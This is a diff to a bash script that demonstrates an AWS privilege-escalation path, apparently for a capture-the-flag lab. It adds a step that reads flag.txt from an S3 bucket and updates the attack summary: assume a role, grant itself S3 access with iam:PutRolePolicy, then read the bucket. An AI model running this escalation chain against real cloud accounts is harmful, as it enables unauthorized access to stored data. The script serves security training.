@@ -205,18 +205,25 @@ echo -e "${YELLOW}Contents of sensitive file:${NC}"
 cat $DOWNLOAD_FILE
 echo ""
 
+# [EXPLOIT] Step 8: Read the CTF flag
+echo -e "${YELLOW}Step 8: Reading CTF flag from bucket${NC}"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/flag.txt -"
+FLAG_VALUE=$(aws s3 cp s3://$BUCKET_NAME/flag.txt -)
+echo -e "${GREEN}Flag: $FLAG_VALUE${NC}\n"
+
 # Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
 echo -e "Step 2: Used ${YELLOW}iam:PutRolePolicy${NC} to add S3 access to self"
 echo -e "Step 3: Accessed ${YELLOW}$BUCKET_NAME${NC}"
+echo -e "Step 4: Read ${YELLOW}flag.txt${NC} — ${GREEN}$FLAG_VALUE${NC}"
 echo -e "Result: ${GREEN}S3 Bucket Access${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → S3 Bucket"
+echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → S3 Bucket → flag.txt (CTF flag)"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
